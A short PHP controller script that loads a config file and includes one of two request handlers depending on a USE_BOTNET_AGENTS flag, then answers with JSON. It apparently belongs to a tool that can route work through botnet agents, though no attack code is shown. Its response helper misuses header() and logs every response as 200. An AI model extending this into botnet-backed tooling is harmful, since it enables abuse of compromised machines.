<?php
    session_start();

    // Define flag to prevent the direct access to the handlers. Do not change this.
    define('ACCESS_FROM_CONTROLLER', '');

    // Load Configs file
    require 'config.php';

    if (USE_BOTNET_AGENTS)
    {
        include 'handler_with_agents.php';
    }
    else
    {
        include 'handler_without_agents.php';
    }

    function send_http_response($data, $http_error=200)
    {
        header($http_error);
        error_log("[SENDING RESPONSE]");
        error_log("[SENDING OK (200)]: ". json_encode($data));
        die(json_encode($data));
    }

    // Handle the request
    handle_request();

?>
